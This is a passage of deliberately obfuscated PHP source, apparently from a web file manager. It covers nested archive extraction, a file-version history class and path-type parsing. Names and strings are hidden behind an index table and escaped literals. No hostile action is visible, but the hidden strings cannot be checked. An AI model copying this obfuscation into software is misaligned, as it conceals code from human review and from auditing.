$×ó„û¹£[0][$¿úÕøœ–[32]]; } else { if (is_array($¦¿·¬—)) { $×ó„û¹£ = $¦¿·¬—; $üşõ‘ì = count($×ó„û¹£) - 1; for ($šó“Ôªı = 0; $šó“Ôªı <= $üşõ‘ì; $šó“Ôªı++) { $ì‰ÃÈàã = $×ó„û¹£[$šó“Ôªı]; $íÙâÜ”Ä = get_path_this($ì‰ÃÈàã[$¿úÕøœ–[32]]) . (checkExtSafe($ì‰ÃÈàã[$¿úÕøœ–[32]]) ? $¿úÕøœ–[12] : $¿úÕøœ–[1208]); $×ó„û¹£[$šó“Ôªı][$¿úÕøœ–[1207]] = $¿úÕøœ–[1209] . intval($ì‰ÃÈàã[$¿úÕøœ–[1192]]) . $¿úÕøœ–[386] . $íÙâÜ”Ä; if ($šó“Ôªı == 0) { continue; } $×ó„û¹£[$šó“Ôªı][$¿úÕøœ–[1207]] = $×ó„û¹£[$šó“Ôªı - 1][$¿úÕøœ–[1207]] . $¿úÕøœ–[1210] . $×ó„û¹£[$šó“Ôªı][$¿úÕøœ–[1207]]; } } } if (!is_array($×ó„û¹£) || count($×ó„û¹£) == 0) { return !1; } $Š–Ö©Û¬ = $×ó„û¹£[count($×ó„û¹£) - 1]; if (!IO::exist($ÜğÖîÛ­)) { return !1; } $¢©«ƒã¹ = TEMP_FILES . $¿úÕøœ–[1211] . kodIO::hashPathSafe($ÜğÖîÛ­) . $¿úÕøœ–[8]; $¦µº¸ğÜ = $¢©«ƒã¹ . $Š–Ö©Û¬[$¿úÕøœ–[1207]]; mk_dir($¢©«ƒã¹); file_put_contents(TEMP_FILES . $¿úÕøœ–[1186], $¿úÕøœ–[12]); if (IO::exist($¦µº¸ğÜ)) { return array($¿úÕøœ–[200] => $¦µº¸ğÜ, $¿úÕøœ–[1191] => $×ó„û¹£, $¿úÕøœ–[1193] => $¢©«ƒã¹); } $‚‘ˆÒ§ = self::localFilePath($ÜğÖîÛ­); if (!$‚‘ˆÒ§) { $‚‘ˆÒ§ = $¢©«ƒã¹ . $¿úÕøœ–[1212]; if (!IO::exist($‚‘ˆÒ§)) { self::copy($ÜğÖîÛ­, $¢©«ƒã¹, !1, get_path_this($‚‘ˆÒ§)); } } if (!$‚‘ˆÒ§ || !IO::exist($‚‘ˆÒ§)) { return !1; } if ($Š–Ö©Û¬[$¿úÕøœ–[1192]] == -1) { return array($¿úÕøœ–[200] => $‚‘ˆÒ§, $¿úÕøœ–[1191] => $×ó„û¹£, $¿úÕøœ–[1193] => $¢©«ƒã¹); } $™óÄ‡Ú­ = $‚‘ˆÒ§; foreach ($×ó„û¹£ as $šó“Ôªı => $ì‰ÃÈàã) { if (!$ì‰ÃÈàã || $ì‰ÃÈàã[$¿úÕøœ–[1192]] == $¿úÕøœ–[1190]) { break; } if (substr($ì‰ÃÈàã[$¿úÕøœ–[32]], -1, 1) == $¿úÕøœ–[8]) { break; } $‡ÉâÕ›ä = in_array(get_path_ext($ì‰ÃÈàã[$¿úÕøœ–[1207]]), array($¿úÕøœ–[313], $¿úÕøœ–[1197], $¿úÕøœ–[1198], $¿úÕøœ–[1199], $¿úÕøœ–[1200], $¿úÕøœ–[1201])); $¼ªİÁ¦ = $šó“Ôªı == count($×ó„û¹£) - 1 && $‡ÉâÕ›ä; $•Í´Œ•ş = $¢©«ƒã¹ . $ì‰ÃÈàã[$¿úÕøœ–[1207]]; $¶¨…Ï‘Á = $¢©«ƒã¹ . get_path_this($ì‰ÃÈàã[$¿úÕøœ–[32]]); if (IO::exist($•Í´Œ•ş)) { $™óÄ‡Ú­ = $•Í´Œ•ş; continue; } $ê“Ö½º = $šó“Ôªı == 0 ? get_path_ext($Á´ßÀ’) : get_path_ext($™óÄ‡Ú­); $€ÆŠĞ›ş = KodArchive::extract(self::iconvSystem($™óÄ‡Ú­), $¢©«ƒã¹, $ì‰ÃÈàã[$¿úÕøœ–[1192]], $„ÂË±À, $ê“Ö½º); self::unzipErrorCheck($€ÆŠĞ›ş, array($¿úÕøœ–[1213], $ÜğÖîÛ­, $×ó„û¹£, $ì‰ÃÈàã, $•Í´Œ•ş)); if (IO::exist($¶¨…Ï‘Á)) { IO::rename($¶¨…Ï‘Á, get_path_this($•Í´Œ•ş)); } $™óÄ‡Ú­ = $•Í´Œ•ş; } $¦µº¸ğÜ = $™óÄ‡Ú­; return array($¿úÕøœ–[200] => $™óÄ‡Ú­, $¿úÕøœ–[1191] => $×ó„û¹£, $¿úÕøœ–[1193] => $¢©«ƒã¹); } private static function unzipErrorCheck($’ÂÎÌ¹², $·ÕÎéôñ = false) { $²œ°»Û =& $_SERVER[Îûáû“ş]; if ($’ÂÎÌ¹²[$²œ°»Û[1214]]) { return !0; } write_log(array($²œ°»Û[1215], $’ÂÎÌ¹², $·ÕÎéôñ), $²œ°»Û[1216]); show_json($²œ°»Û[1217] . json_encode($’ÂÎÌ¹²[$²œ°»Û[1204]]), !1); die; } } class IOHistory { public static $_historyBase = ''; function __construct() { } public static function bindEvent() { $®êˆÍå =& $_SERVER[Îûáû“ş]; $½Å›œ°¹ = $GLOBALS[$®êˆÍå[6]][$®êˆÍå[89]]; if ($½Å›œ°¹[$®êˆÍå[1218]] != 1) { return; } if ($½Å›œ°¹[$®êˆÍå[1219]] <= 0) { return; } if (isset($_REQUEST[$®êˆÍå[1220]]) && $_REQUEST[$®êˆÍå[1220]] == $®êˆÍå[88]) { return; } Hook::bind($®êˆÍå[1221], $®êˆÍå[1222]); Hook::bind($®êˆÍå[1223], $®êˆÍå[1224]); Hook::bind($®êˆÍå[1225], $®êˆÍå[1226]); Hook::bind($®êˆÍå[1227], $®êˆÍå[1228]); Hook::bind($®êˆÍå[1229], $®êˆÍå[1230]); Hook::bind($®êˆÍå[1231], $®êˆÍå[1232]); } public static function eventBeforeUpload($××—Ê»Ÿ) { if ($××—Ê»Ÿ[3] && $××—Ê»Ÿ[3] != REPEAT_REPLACE) { return; } $êó€ÕÕË = self::parsePath($××—Ê»Ÿ[0]); if (!$êó€ÕÕË) { return; } self::add($êó€ÕÕË); } public static function eventBeforeEdit($øØâÑ) { $…îç– = self::parsePath($øØâÑ[0]); if (!$…îç–) { return; } self::add($…îç–); } public static function eventBeforeCopyFile($ÆÒ¯èí­, $¾„¢ø©, $Úœ…éş, $Ô´éå£, $ğäç‹ğĞ, $·½¾ÏŠÅ) { $„äĞÂæ =& $_SERVER[Îûáû“ş]; if (isset($Úœ…éş->_data[$„äĞÂæ[1157]]) && $Úœ…éş->_data[$„äĞÂæ[1157]]) { return; } $Ö¹Û¦˜Š = $Úœ…éş->getPathOuter($Ô´éå£); $Ê†É®ØÕ = self::parsePath($Ö¹Û¦˜Š); if (!$Ê†É®ØÕ) { return; } self::add($Ê†É®ØÕ); } public static function eventBeforeRename($¹Ïñùº) { $§ÀÉï¿ƒ =& $_SERVER[Îûáû“ş]; $šş†û±Ş = self::parsePath($¹Ïñùº[0]); if (!$šş†û±Ş) { return; } $œ÷«Œö… = self::checkInHistory($šş†û±Ş); if (!$œ÷«Œö…) { return; } if ($œ÷«Œö…[$§ÀÉï¿ƒ[33]] == $§ÀÉï¿ƒ[200]) { $î¬ıóù‚ = self::listData($šş†û±Ş); if ($î¬ıóù‚ && $î¬ıóù‚[$§ÀÉï¿ƒ[369]]) { self::moveHistory($šş†û±Ş, $¹Ïñùº[1]); } } else { IO::rename($œ÷«Œö…[$§ÀÉï¿ƒ[84]], $¹Ïñùº[1]); } } public static function eventBeforeMove($ƒª–œ—) { $Èèİäé =& $_SERVER[Îûáû“ş]; $ûÑÇóÕ = self::parsePath($ƒª–œ—[0]); if (!$ûÑÇóÕ) { return; } $î²¬Ì×Ï = self::parsePath($ƒª–œ—[1]); if (!$î²¬Ì×Ï) { return; } $³æ·´‰Ô = $ƒª–œ—[3]; $Ì†ıª°¿ = self::checkInHistory($ûÑÇóÕ); if (!$Ì†ıª°¿) { return; } $’²É¹œä = self::pathHistory($î²¬Ì×Ï); if ($Ì†ıª°¿[$Èèİäé[33]] == $Èèİäé[200]) { $òïõÉ©À = self::listData($ûÑÇóÕ); $â©âœ¥İ = rtrim($î²¬Ì×Ï, $Èèİäé[8]) . $Èèİäé[8] . ($³æ·´‰Ô ? $³æ·´‰Ô : get_path_this($ûÑÇóÕ)); $Ú“üÏûß = self::listData($â©âœ¥İ); if ($òïõÉ©À && $òïõÉ©À[$Èèİäé[369]] && $Ú“üÏûß && $Ú“üÏûß[$Èèİäé[369]]) { return self::clear($ûÑÇóÕ); } if ($òïõÉ©À && $òïõÉ©À[$Èèİäé[369]]) { self::moveHistory($ûÑÇóÕ, $³æ·´‰Ô, $’²É¹œä); } } else { IO::move($Ì†ıª°¿[$Èèİäé[84]], $’²É¹œä, !1, $³æ·´‰Ô); self::clearEmptyFolder(IO::pathFather($Ì†ıª°¿[$Èèİäé[84]])); } } public static function eventAfterRemove($“—­‰ŒÉ, $êÑÕ³Ç) { $Ğ¯óè¬¨ =& $_SERVER[Îûáû“ş]; if (!$êÑÕ³Ç) { return; } $«›‚É”ö = self::parsePath($“—­‰ŒÉ[0]); if (!$«›‚É”ö) { return; } $â™ğ–Â“ = self::checkInHistory($«›‚É”ö); if (!$â™ğ–Â“) { return; } if ($â™ğ–Â“[$Ğ¯óè¬¨[33]] == $Ğ¯óè¬¨[200]) { $ÜÖ¬šöÔ = self::listData($«›‚É”ö, !1); if ($ÜÖ¬šöÔ && $ÜÖ¬šöÔ[$Ğ¯óè¬¨[369]]) { self::clear($«›‚É”ö, !1); } } else { IO::remove($â™ğ–Â“[$Ğ¯óè¬¨[84]]); self::clearEmptyFolder(IO::pathFather($â™ğ–Â“[$Ğ¯óè¬¨[84]])); } } private static function checkInHistory($Ò³Ş˜Ôã) { $ÅÑÒâ¿Æ = self::pathHistory($Ò³Ş˜Ôã); if (!IO::exist($ÅÑÒâ¿Æ)) { $ÅÑÒâ¿Æ .= $_SERVER[Îûáû“ş][1233]; } return IO::exist($ÅÑÒâ¿Æ) ? IO::info($ÅÑÒâ¿Æ) : !1; } private static function parsePath($©Å°¼Á§) { $›¤³—ÚŸ =& $_SERVER[Îûáû“ş]; if (!$©Å°¼Á§) { return !1; } if ($GLOBALS[$›¤³—ÚŸ[1234]]) { return; } $Ş÷Óş• = KodIO::parse($©Å°¼Á§); $¤›©½º = $Ş÷Óş•[$›¤³—ÚŸ[33]]; $¿¿¬³†³ = !$¤›©½º || $¤›©½º == KodIO::KOD_IO || $¤›©½º == KodIO::KOD_SHARE_ITEM; if (!$¿¿¬³†³ || !$Ş÷Óş•[$›¤³—ÚŸ[1235]]) { return !1; } if (substr($©Å°¼Á§, 0, strlen(DATA_PATH . $›¤³—ÚŸ[1236])) == DATA_PATH . $›¤³—ÚŸ[1236]) { return !1; } if ($¤›©½º == KodIO::KOD_SHARE_ITEM) { $Ôß÷Úıã = IO::init($©Å°¼Á§); if ($Ôß÷Úıã->pathParse[$›¤³—ÚŸ[1153]]) { return self::parsePath($Ôß÷Úıã->pathParse[$›¤³—ÚŸ[1153]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $Õ‹à­Şì = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $›¤³—ÚŸ[1237]); foreach ($Õ‹à­Şì as $àîˆå‘Í) { if (!$¤›©½º && substr($©Å°¼Á§, 0, strlen($àîˆå‘Í)) == $àîˆå‘Í) { return !1; } } self::log($GLOBALS[$›¤³—ÚŸ[1148]] . $›¤³—ÚŸ[1238] . $©Å°¼Á§); return $©Å°¼Á§; } private static function pathHistory($ØŠÙ¢›) { $ı„±‘ÍË =& $_SERVER[Îûáû“ş]; $Í°¥¶±ò = self::$_historyBase . ltrim(KodIO::clear($ØŠÙ¢›), $ı„±‘ÍË[8]); $Í°¥¶±ò = str_replace(array($ı„±‘ÍË[1239]), array($ı„±‘ÍË[1240]), $Í°¥¶±ò); return $Í°¥¶±ò; } public static function log($ôÂÁèñÓ) { } public static function historyCount($ƒ³Ë¨«) { $ëêõàÒÓ =& $_SERVER[Îûáû“ş]; $¼‘±³è = array(); $ËºâÄ¸ = array(); foreach ($ƒ³Ë¨« as $Ü±Ö±×¡) { $©Ìæ„£Ò = get_path_father($Ü±Ö±×¡); if (!$ËºâÄ¸[$©Ìæ„£Ò]) { $ËºâÄ¸[$©Ìæ„£Ò] = array(); } $ËºâÄ¸[$©Ìæ„£Ò][] = get_path_this($Ü±Ö±×¡); } foreach ($ËºâÄ¸ as $©Ìæ„£Ò => $Ğ˜®½ğ) { $”–İÆğâ = self::parsePath($©Ìæ„£Ò); if (!$”–İÆğâ) { continue; } foreach ($Ğ˜®½ğ as $¥şî§Š®) { $«©ºòÉ = self::listData(rtrim($”–İÆğâ, $ëêõàÒÓ[8]) . $ëêõàÒÓ[8] . $¥şî§Š®, !1); if ($«©ºòÉ && $«©ºòÉ[$ëêõàÒÓ[369]]) { $¼‘±³è[rtrim($©Ìæ„£Ò, $ëêõàÒÓ[8]) . $ëêõàÒÓ[8] . $¥şî§Š®] = count($«©ºòÉ[$ëêõàÒÓ[369]]); } } } return $¼‘±³è; } public static function add($Š¢¬ğİ) { $ÅƒÖ¶Ç =& $_SERVER[Îûáû“ş]; $Å´Õ¡óª = self::listData($Š¢¬ğİ); if (!$Å´Õ¡óª) { return; } $–² ‘ûß = Model($ÅƒÖ¶Ç[769])->get($ÅƒÖ¶Ç[1241]); $å—¸šÕ = $GLOBALS[$ÅƒÖ¶Ç[6]][$ÅƒÖ¶Ç[89]][$ÅƒÖ¶Ç[1219]]; $¶¶½›‹â = $–² ‘ûß == $ÅƒÖ¶Ç[1242] ? min(5, $å—¸šÕ) : $å—¸šÕ; if ($å—¸šÕ <= 0) { return; } $ÇÖ¹Üıœ = IO::info($Š¢¬ğİ); $•å±”¤ç = $Å´Õ¡óª[$ÅƒÖ¶Ç[369]]; if ($ÇÖ¹Üıœ[$ÅƒÖ¶Ç[76]] == 0) { return; } if ($ÇÖ¹Üıœ[$ÅƒÖ¶Ç[76]] >= 1024 * 1024 * 500) { return !1; } $şé í² = IO::hashSimple($Š¢¬ğİ); if ($•å±”¤ç && $•å±”¤ç[0][$ÅƒÖ¶Ç[177]] == $şé í²) { return !0; } if (array_key_exists($ÅƒÖ¶Ç[203], $ÇÖ¹Üıœ) && !$ÇÖ¹Üıœ[$ÅƒÖ¶Ç[203]]) { return !1; } $¤ÔÒ¡ó = short_id(time()); $ğÎÍ×«Õ = array($ÅƒÖ¶Ç[399] => $¤ÔÒ¡ó, $ÅƒÖ¶Ç[177] => $şé í², $ÅƒÖ¶Ç[32] => $ÇÖ¹Üıœ[$ÅƒÖ¶Ç[32]] . $ÅƒÖ¶Ç[10] . date($ÅƒÖ¶Ç[1243]) . rand_string(1), $ÅƒÖ¶Ç[76] => $ÇÖ¹Üıœ[$ÅƒÖ¶Ç[76]], $ÅƒÖ¶Ç[454] => USER_ID, $ÅƒÖ¶Ç[201] => time(), $ÅƒÖ¶Ç[1244] => $ÅƒÖ¶Ç[12]); IO::mkdir($Å´Õ¡óª[$ÅƒÖ¶Ç[1245]]); $šóØúõ¯ = IO::copy($Š¢¬ğİ, $Å´Õ¡óª[$ÅƒÖ¶Ç[1245]], !1, $ğÎÍ×«Õ[$ÅƒÖ¶Ç[32]]); if (!$šóØúõ¯) { self::clearEmptyFolder($Å´Õ¡óª[$ÅƒÖ¶Ç[1245]]); return !1; } array_unshift($•å±”¤ç, $ğÎÍ×«Õ); if (count($•å±”¤ç) > $¶¶½›‹â) { $²©˜—¿¯ = array_slice($•å±”¤ç, $¶¶½›‹â); foreach ($²©˜—¿¯ as $Š«ÉåúÙ) { IO::remove($Å´Õ¡óª[$ÅƒÖ¶Ç[1245]] . $Š«ÉåúÙ[$ÅƒÖ¶Ç[32]]); } $•å±”¤ç = array_slice($•å±”¤ç, 0, $¶¶½›‹â); } return self::saveData($Å´Õ¡óª[$ÅƒÖ¶Ç[1246]], $•å±”¤ç); } public static function remove($øÛ§†È, $²™ËâÆÃ) { $Ş´‚–Ê =& $_SERVER[Îûáû“ş]; $ÅÜí­¤ = self::listData($øÛ§†È); $Ø§†ù = array(); if (!$ÅÜí­¤) { return !1; } foreach ($ÅÜí­¤[$Ş´‚–Ê[369]] as $şã°æí) { if ($şã°æí[$Ş´‚–Ê[399]] == $²™ËâÆÃ) { IO::remove($ÅÜí­¤[$Ş´‚–Ê[1245]] . $şã°æí[$Ş´‚–Ê[32]]); continue; } $Ø§†ù[] = $şã°æí; } return self::saveData($ÅÜí­¤[$Ş´‚–Ê[1246]], $Ø§†ù); } public static function clear($ÕœËƒı…, $Š´ÂˆŒ = true) { $ÕÅü‡àˆ =& $_SERVER[Îûáû“ş]; $“‹£º€ = self::listData($ÕœËƒı…, $Š´ÂˆŒ); if (!$“‹£º€) { return !1; } foreach ($“‹£º€[$ÕÅü‡àˆ[369]] as $Í©–ŞªŸ) { IO::remove($“‹£º€[$ÕÅü‡àˆ[1245]] . $Í©–ŞªŸ[$ÕÅü‡àˆ[32]]); } return self::saveData($“‹£º€[$ÕÅü‡àˆ[1246]], array()); } public static function moveHistory($¶Í¸®ƒç, $¸šûÑâ® = '', $íÊƒ¶ Â = '') { $²ÏüµÇø =& $_SERVER[Îûáû“ş]; $Õç‘÷©š = self::listData($¶Í¸®ƒç, !1); if (!$Õç‘÷©š || !$Õç‘÷©š[$²ÏüµÇø[369]]) { return !1; } $Ÿ´Ûæ¾Ï = $²ÏüµÇø[1233]; $¸šûÑâ® = $¸šûÑâ® ? $¸šûÑâ® : get_path_this($¶Í¸®ƒç); $íÊƒ¶ Â = $íÊƒ¶ Â ? $íÊƒ¶ Â : $Õç‘÷©š[$²ÏüµÇø[1245]]; $ş¡µëÀ™ = substr(get_path_this($Õç‘÷©š[$²ÏüµÇø[1246]]), 0, -strlen($Ÿ´Ûæ¾Ï)); foreach ($Õç‘÷©š[$²ÏüµÇø[369]] as $´ä°Ø€å => $æ ª÷•Ë) { $ñ§û”î÷ = $¸šûÑâ® . substr($æ ª÷•Ë[$²ÏüµÇø[32]], strlen($ş¡µëÀ™)); $ÊÂà•ŒÓ = IO::move($Õç‘÷©š[$²ÏüµÇø[1245]] . $æ ª÷•Ë[$²ÏüµÇø[32]], $íÊƒ¶ Â, !1, $ñ§û”î÷); if ($ÊÂà•ŒÓ) { $Õç‘÷©š[$²ÏüµÇø[369]][$´ä°Ø€å][$²ÏüµÇø[32]] = $ñ§û”î÷; } } $Õç‘÷©š[$²ÏüµÇø[1246]] = IO::move($Õç‘÷©š[$²ÏüµÇø[1246]], $íÊƒ¶ Â, !1, $¸šûÑâ® . $Ÿ´Ûæ¾Ï); self::saveData($Õç‘÷©š[$²ÏüµÇø[1246]], $Õç‘÷©š[$²ÏüµÇø[369]]); self::clearEmptyFolder($Õç‘÷©š[$²ÏüµÇø[1245]]); } public static function rollback($üÑ¾ŸÍĞ, $õçùÓ¥«) { $Ğå”Ò…ù =& $_SERVER[Îûáû“ş]; $‚ÁŸÕ’´ = self::listData($üÑ¾ŸÍĞ); if (!$‚ÁŸÕ’´) { return; } $—¸Ï×› = IO::info($üÑ¾ŸÍĞ); foreach ($‚ÁŸÕ’´[$Ğå”Ò…ù[369]] as $òÔöû³œ => $™Ò…å„Û) { if ($™Ò…å„Û[$Ğå”Ò…ù[399]] == $õçùÓ¥«) { self::add($üÑ¾ŸÍĞ); $İ½¶í¦¿ = $‚ÁŸÕ’´[$Ğå”Ò…ù[1245]] . $™Ò…å„Û[$Ğå”Ò…ù[32]]; $‡ë•ıüª = IO::copy($İ½¶í¦¿, IO::pathFather($üÑ¾ŸÍĞ), REPEAT_REPLACE, $—¸Ï×›[$Ğå”Ò…ù[32]]); if ($‡ë•ıüª) { self::remove($üÑ¾ŸÍĞ, $õçùÓ¥«); } return $‡ë•ıüª; } } return !1; } public static function setDetail($´‰’º¶, $² ÛûÎ÷, $Û§ØŠÂƒ) { $ ±¯İ£ı =& $_SERVER[Îûáû“ş]; $ìÉ®µİç = self::listData($´‰’º¶); if (!$ìÉ®µİç) { return; } foreach ($ìÉ®µİç[$ ±¯İ£ı[369]] as $ßÆ—Ø»Š => $Á’°é¼Ê) { if ($Á’°é¼Ê[$ ±¯İ£ı[399]] == $² ÛûÎ÷) { $ìÉ®µİç[$ ±¯İ£ı[369]][$ßÆ—Ø»Š][$ ±¯İ£ı[1244]] = $Û§ØŠÂƒ; self::saveData($ìÉ®µİç[$ ±¯İ£ı[1246]], $ìÉ®µİç[$ ±¯İ£ı[369]]); return !0; } } return !1; } public static function fileInfo($Ø‰ã¢ÏŠ, $ûÁ¶°æ³) { $Œªˆİè =& $_SERVER[Îûáû“ş]; $ó¼Ë¦×¿ = self::listData($Ø‰ã¢ÏŠ); if (!$ó¼Ë¦×¿) { show_json(LNG($Œªˆİè[105]), !1); } $©Ï“˜Ä¥ = $Œªˆİè[12]; foreach ($ó¼Ë¦×¿[$Œªˆİè[369]] as $´ôåáÄ½ => $ñÜô•„¡) { if ($ñÜô•„¡[$Œªˆİè[399]] != $ûÁ¶°æ³) { continue; } $©Ï“˜Ä¥ = $ó¼Ë¦×¿[$Œªˆİè[1245]] . $ñÜô•„¡[$Œªˆİè[32]]; break; } if (!$©Ï“˜Ä¥) { show_json(LNG($Œªˆİè[105]), !1); } return IO::info($©Ï“˜Ä¥); } public static function fileOut($¦¡ã€Á, $êşêÂÖ, $ëÃ˜•ïè = false) { $ÂÚêÍÏ =& $_SERVER[Îûáû“ş]; $ŞÉƒæ«ë = self::fileInfo($¦¡ã€Á, $êşêÂÖ); $Šˆâİ¹¾ =& $GLOBALS[$ÂÚêÍÏ[7]]; $ëÃ˜•ïè = isset($Šˆâİ¹¾[$ÂÚêÍÏ[1196]]) && $Šˆâİ¹¾[$ÂÚêÍÏ[1196]] == 1; if (isset($Šˆâİ¹¾[$ÂÚêÍÏ[33]]) && $Šˆâİ¹¾[$ÂÚêÍÏ[33]] == $ÂÚêÍÏ[1247]) { return IO::fileOutImage($ŞÉƒæ«ë[$ÂÚêÍÏ[84]], $Šˆâİ¹¾[$ÂÚêÍÏ[1248]]); } IO::fileOut($ŞÉƒæ«ë[$ÂÚêÍÏ[84]], $ëÃ˜•ïè, get_path_this($¦¡ã€Á)); } public static function listData($ïİªá¿Í, $¸–šŒçÙ = true) { $¼è†¸¥ =& $_SERVER[Îûáû“ş]; if ($¸–šŒçÙ && !IO::exist($ïİªá¿Í)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ïİªá¿Í, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $ğøü¡” = self::pathHistory($ïİªá¿Í); $¨Ñ‘†¹ñ = array($¼è†¸¥[1246] => $ğøü¡” . $¼è†¸¥[1233], $¼è†¸¥[1245] => rtrim(get_path_father($ğøü¡”), $¼è†¸¥[8]) . $¼è†¸¥[8], $¼è†¸¥[369] => array()); $ô£”ù¾ = IO::getContent($¨Ñ‘†¹ñ[$¼è†¸¥[1246]]); if ($ô£”ù¾) { $õ¯­Ïş˜ = json_decode($ô£”ù¾, !0); if (is_array($õ¯­Ïş˜)) { $¨Ñ‘†¹ñ[$¼è†¸¥[369]] = $õ¯­Ïş˜; } } return $¨Ñ‘†¹ñ; } private static function saveData($Ø¿ó•ê, $Å€¾ˆ¼Æ) { $ö© ‚Â¿ =& $_SERVER[Îûáû“ş]; self::log($ö© ‚Â¿[1249] . $Ø¿ó•ê . $ö© ‚Â¿[71] . count($Å€¾ˆ¼Æ), $ö© ‚Â¿[750]); if ($Å€¾ˆ¼Æ) { return IO::setContent($Ø¿ó•ê, json_encode($Å€¾ˆ¼Æ)); } $¾Ë§¢Õ– = IO::pathFather($Ø¿ó•ê); IO::remove($Ø¿ó•ê); self::clearEmptyFolder($¾Ë§¢Õ–); return !0; } public static function clearEmptyFolder($·öôÙË) { $Æ­Ø¢¶Ë =& $_SERVER[Îûáû“ş]; if (trim($·öôÙË, $Æ­Ø¢¶Ë[8]) == trim(self::$_historyBase, $Æ­Ø¢¶Ë[8])) { return; } $€ñˆ½óİ = IO::pathFather($·öôÙË); $õøá¡ì = IO::has($·öôÙË, !0); if ($õøá¡ì[$Æ­Ø¢¶Ë[207]] > 0 || $õøá¡ì[$Æ­Ø¢¶Ë[208]] > 0) { return; } IO::remove($·öôÙË); self::clearEmptyFolder($€ñˆ½óİ); } private static function getBasePath() { $µ¤ˆÒÓ‘ =& $_SERVER[Îûáû“ş]; $‰õüñ“® = Model($µ¤ˆÒÓ‘[1250])->get($µ¤ˆÒÓ‘[1251]); if ($‰õüñ“®) { if (!IO::exist($‰õüñ“®)) { IO::mkdir($‰õüñ“®); } if (get_path_this($‰õüñ“®) == $µ¤ˆÒÓ‘[1236]) { $‰ºñ¦ = $µ¤ˆÒÓ‘[1252] . rand_string(8); @rename($‰õüñ“®, get_path_father($‰õüñ“®) . $µ¤ˆÒÓ‘[8] . $‰ºñ¦); $‰õüñ“® = DATA_PATH . $‰ºñ¦ . $µ¤ˆÒÓ‘[8]; file_put_contents(DATA_PATH . $µ¤ˆÒÓ‘[1186], $µ¤ˆÒÓ‘[12]); Model($µ¤ˆÒÓ‘[1250])->set($µ¤ˆÒÓ‘[1251], $‰õüñ“®); } return $‰õüñ“®; } $‰õüñ“® = DATA_PATH . $µ¤ˆÒÓ‘[1252] . rand_string(8) . $µ¤ˆÒÓ‘[8]; $‰õüñ“® = IO::mkdir($‰õüñ“®); $‰õüñ“® = rtrim($‰õüñ“®, $µ¤ˆÒÓ‘[8]) . $µ¤ˆÒÓ‘[8]; file_put_contents($‰õüñ“® . $µ¤ˆÒÓ‘[1186], $µ¤ˆÒÓ‘[12]); file_put_contents(DATA_PATH . $µ¤ˆÒÓ‘[1186], $µ¤ˆÒÓ‘[12]); Model($µ¤ˆÒÓ‘[1250])->set($µ¤ˆÒÓ‘[1251], $‰õüñ“®); return $‰õüñ“®; } } class KodIO { const KOD_SOURCE = "\x7b\x73\x6f\x75\x72\143\x65\175"; const KOD_USER_RECYCLE = "\173\165\x73\145\x72\x52\145\143\171\143\154\x65\x7d"; const KOD_USER_FAV = "\173\x75\163\145\x72\x46\141\x76\175"; const KOD_USER_FILE_TAG = "\x7b\x75\163\x65\x72\x46\151\154\145\124\141\x67\x7d"; const KOD_USER_FILE_TYPE = "\173\165\x73\x65\162\x46\x69\x6c\x65\124\171\x70\x65\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\157\x75\160\x52\x6f\x6f\x74\123\145\x6c\x66\x7d"; const KOD_USER_SHARE = "\173\165\163\145\162\123\x68\141\162\x65\x7d"; const KOD_USER_SHARE_LINK = "\173\165\163\x65\162\123\150\x61\162\145\x4c\x69\x6e\153\175"; const KOD_USER_SHARE_TO_ME = "\x7b\x73\x68\141\x72\x65\124\x6f\x4d\145\x7d"; const KOD_SHARE_ITEM = "\x7b\163\150\x61\162\x65\x49\x74\145\x6d\x7d"; const KOD_SHARE_LINK = "\173\163\150\x61\x72\x65\x49\x74\145\155\x4c\x69\x6e\153\175"; const KOD_SEARCH = "\173\x73\145\141\x72\143\x68\175"; const KOD_BLOCK = "\173\142\154\x6f\143\153\x7d"; const KOD_IO = "\x7b\x69\x6f\175"; const KOD_USER_RECENT = "\x7b\165\163\x65\162\x52\x65\x6e\x63\x65\x6e\x74\x7d"; const KOD_USER_DRIVER = "\x7b\x64\162\x69\x76\145\162\175"; public static function typeList() { $ø˜“Í =& $_SERVER[Îûáû“ş]; return array($ø˜“Í[1253] => self::KOD_SOURCE, $ø˜“Í[1254] => self::KOD_USER_RECYCLE, $ø˜“Í[1255] => self::KOD_USER_FAV, $ø˜“Í[1256] => self::KOD_USER_FILE_TAG, $ø˜“Í[1257] => self::KOD_USER_FILE_TYPE, $ø˜“Í[1258] => self::KOD_GROUP_ROOT_SELF, $ø˜“Í[1259] => self::KOD_USER_SHARE, $ø˜“Í[1260] => self::KOD_USER_SHARE_LINK, $ø˜“Í[1261] => self::KOD_USER_SHARE_TO_ME, $ø˜“Í[1262] => self::KOD_SHARE_ITEM, $ø˜“Í[1263] => self::KOD_SHARE_LINK, $ø˜“Í[1264] => self::KOD_SEARCH, $ø˜“Í[1265] => self::KOD_BLOCK, $ø˜“Í[1266] => self::KOD_IO, $ø˜“Í[1267] => self::KOD_USER_RECENT, $ø˜“Í[1268] => self::KOD_USER_DRIVER); } public static function parse($åŸ­·•) { $êë€¼ÅÒ =& $_SERVER[Îûáû“ş]; $åŸ­·• = self::clear($åŸ­·•); $ãî¼½½• = array_values(self::typeList()); preg_match($êë€¼ÅÒ[1269], $åŸ­·•, $‡ªÖÕ¿û); $İé‘àşÁ = array($êë€¼ÅÒ[422] => !1, $êë€¼ÅÒ[1270] => !1, $êë€¼ÅÒ[419] => !1, $êë€¼ÅÒ[84] => $åŸ­·•, $êë€¼ÅÒ[1171] => !1, $êë€¼ÅÒ[1170] => $êë€¼ÅÒ[12]); if (is_array($‡ªÖÕ¿û) && count($‡ªÖÕ¿û) == 5) { $ğ¨›†ƒÔ = $êë€¼ÅÒ[1271] . $‡ªÖÕ¿û[2] . $êë€¼ÅÒ[327]; if (in_array($ğ¨›†ƒÔ, $ãî¼½½•)) { $İé‘àşÁ[$êë€¼ÅÒ[1171]] = $‡ªÖÕ¿û[1]; $İé‘àşÁ[$êë€¼ÅÒ[33]] = $ğ¨›†ƒÔ; $İé‘àşÁ[$êë€¼ÅÒ[1272]] = substr($ğ¨›†ƒÔ, 1, -1); $İé‘àşÁ[$êë€¼ÅÒ[399]] = $‡ªÖÕ¿û[3]; } $İé‘àşÁ[$êë€¼ÅÒ[1170]] = $‡ªÖÕ¿û[4]; } $º»ßĞ”ä = array($êë€¼ÅÒ[12], 